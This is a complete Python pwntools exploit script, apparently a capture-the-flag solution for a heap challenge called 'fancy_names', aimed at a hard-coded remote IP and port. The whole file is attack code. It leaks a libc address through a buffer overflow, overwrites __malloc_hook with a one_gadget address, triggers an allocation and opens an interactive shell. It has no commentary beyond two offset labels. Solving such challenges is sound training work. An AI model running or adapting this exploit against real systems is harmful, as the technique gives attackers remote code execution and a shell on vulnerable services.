#!/usr/bin/python3
from pwn import process, p64, u64, remote

shell = remote("94.237.59.129", 47460)
#shell = process("./fancy_names")

shell.sendlineafter(b"> ", b"1")
shell.sendlineafter(b": ", b"A" * 55)
shell.recvline_contains(b"[*] ")

libc_base = u64(shell.recvline().strip().ljust(8, b"\x00")) - 0x64f44

shell.sendlineafter(b": ", b"n")
shell.sendlineafter(b"> ", b"2")
shell.sendlineafter(b"> ", b"4")

shell.sendlineafter(b"> ", b"1")
shell.sendlineafter(b": ", p64(libc_base + 0x3ebc30)[:-2]) # __malloc_hook
shell.sendlineafter(b": ", b"y")

shell.sendlineafter(b"> ", b"3")

for i in range(2):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b": ", b"100")
    shell.sendlineafter(b": ", p64(libc_base + 0x10a41c)) # one_gadget

shell.sendlineafter(b"> ", b"1")
shell.sendlineafter(b": ", b"100")

shell.interactive()
